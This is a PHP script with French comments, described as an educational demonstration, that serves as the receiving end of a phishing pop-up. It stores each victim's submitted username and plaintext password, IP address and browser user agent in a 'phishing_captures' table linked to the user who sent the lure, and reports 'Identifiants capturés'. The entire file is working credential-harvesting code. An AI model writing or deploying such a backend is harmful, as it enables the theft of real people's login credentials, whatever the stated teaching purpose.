<?php
// Fichier de capture des identifiants volés - Démonstration éducative
// Ce fichier reçoit les identifiants du pop-up de phishing

session_start();
header('Content-Type: application/json');

// Récupérer les données
$username = isset($_POST['username']) ? trim($_POST['username']) : '';
$password = isset($_POST['password']) ? trim($_POST['password']) : '';
$sender_id = isset($_POST['sender_id']) ? intval($_POST['sender_id']) : 0;

// Validation basique
if (empty($username) || empty($password) || $sender_id === 0) {
    echo json_encode(['success' => false, 'message' => 'Données manquantes']);
    exit();
}

try {
    // Inclure la connexion à la base de données
    include '../traitements/db.php';
    
    // Créer une table pour stocker les identifiants capturés (si elle n'existe pas)
    $create_table_sql = "CREATE TABLE IF NOT EXISTS phishing_captures (
        id INT AUTO_INCREMENT PRIMARY KEY,
        sender_id INT NOT NULL,
        captured_username VARCHAR(255) NOT NULL,
        captured_password VARCHAR(255) NOT NULL,
        captured_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        ip_address VARCHAR(45),
        user_agent TEXT,
        FOREIGN KEY (sender_id) REFERENCES users(id) ON DELETE CASCADE
    )";
    
    if (!$conn->query($create_table_sql)) {
        echo json_encode(['success' => false, 'message' => 'Erreur DB']);
        exit();
    }
    
    // Récupérer l'IP et user agent pour plus de détails
    $ip_address = $_SERVER['REMOTE_ADDR'] ?? '';
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
    
    // Insérer les identifiants capturés dans la table
    $insert_sql = "INSERT INTO phishing_captures (sender_id, captured_username, captured_password, ip_address, user_agent) 
                   VALUES (?, ?, ?, ?, ?)";
    
    $stmt = $conn->prepare($insert_sql);
    
    if (!$stmt) {
        echo json_encode(['success' => false, 'message' => 'Erreur préparation']);
        exit();
    }
    
    $stmt->bind_param("issss", $sender_id, $username, $password, $ip_address, $user_agent);
    
    if ($stmt->execute()) {
        echo json_encode(['success' => true, 'message' => 'Identifiants capturés']);
        $stmt->close();
    } else {
        echo json_encode(['success' => false, 'message' => 'Erreur insertion']);
    }
    
    $conn->close();
    
} catch (Exception $e) {
    echo json_encode(['success' => false, 'message' => 'Erreur: ' . $e->getMessage()]);
}
?>
